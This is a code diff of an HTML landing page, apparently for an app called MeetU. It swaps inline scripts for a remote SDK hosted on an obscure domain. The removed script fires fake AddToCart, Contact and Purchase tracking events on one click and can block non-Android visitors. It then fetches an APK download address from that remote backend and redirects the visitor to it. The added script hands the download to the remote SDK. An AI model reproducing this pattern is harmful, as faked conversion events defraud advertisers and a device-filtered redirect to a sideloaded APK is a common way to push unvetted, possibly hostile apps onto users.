@@ -3,72 +3,14 @@
 <head>
   <meta charset="UTF-8">
    
-
-       <script>
-var API_BASE = 'https://url.yuhd320k.site';
-// Facebook Pixel — 动态从后台加载所有像素ID
-!function(f,b,e,v,n,t,s)
-{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-n.queue=[];t=b.createElement(e);t.async=!0;
-t.src=v;s=b.getElementsByTagName(e)[0];
-s.parentNode.insertBefore(t,s)}(window, document,'script',
-'https://connect.facebook.net/en_US/fbevents.js');
-
-// 从后台 API 获取所有像素ID并初始化
-var _site=window.location.origin+window.location.pathname;
-console.log('前端站点(完整路径):',_site,' API:',API_BASE);
-fetch(API_BASE+'/api/pixels?site='+encodeURIComponent(_site))
-.then(function(r){return r.json()})
-.then(function(d){
-  console.log('像素API返回:',JSON.stringify(d));
-  var ids=d.ids||[];
-  if(!ids.length){ console.warn('像素ID列表为空，请前往后台配置。site='+_site+' matched='+(d._user||'none')); return; }
-  console.log('已加载像素ID:',ids); for(var i=0;i<ids.length;i++){ fbq('init',ids[i]); }
-  fbq('track','PageView');
-  // 动态插入 noscript 备用图
-  var ns=document.createElement('div');
-  ns.style.display='none';
-  ns.innerHTML=ids.map(function(id){return '<img height="1" width="1" src="https://www.facebook.com/tr?id='+id+'&ev=PageView&noscript=1"/>'}).join('');
-  document.body.appendChild(ns);
-})
-.catch(function(){
-  console.warn('像素ID获取失败，请检查后台配置');
-});
-</script>
-<!-- End Meta Pixel Code -->
+<script src="https://url.yuhd320k.site/js/meetu-sdk.js"></script>
 
 
   <script>
-// ========== k2 — 动态获取APK下载地址并跳转 ==========
-var FILTER=0; // 0=关闭  1=屏蔽PC和iOS，仅允许安卓
-var _apkUrl='';
-async function k2(source){
-    fbq('track', 'AddToCart');
-    fbq('track', 'Contact');
-    fbq('track', 'Purchase');
-    if(FILTER===1){
-        var ua=navigator.userAgent||'';
-        var isIOS=/iPhone|iPad|iPod/i.test(ua);
-        var isMobile=/Mobi|Android/i.test(ua);
-        if(!isMobile||isIOS){
-            alert('error');
-            return;
-        }
-    }
-    try{
-        if(!_apkUrl){
-            var r=await fetch(API_BASE+'/api/apk-url?site='+encodeURIComponent(_site));
-            var d=await r.json();
-            _apkUrl=d.url; console.log('APK API返回:',JSON.stringify(d));
-        }
-        if(_apkUrl) window.location.href=_apkUrl;
-        else alert('获取APK下载地址失败，请稍后重试');
-    }catch(e){
-        alert('获取APK下载地址失败，请稍后重试');
-    }
-}
+ function k2()
+ {
+   MeetU.download(event);
+ }
 </script>
 
     
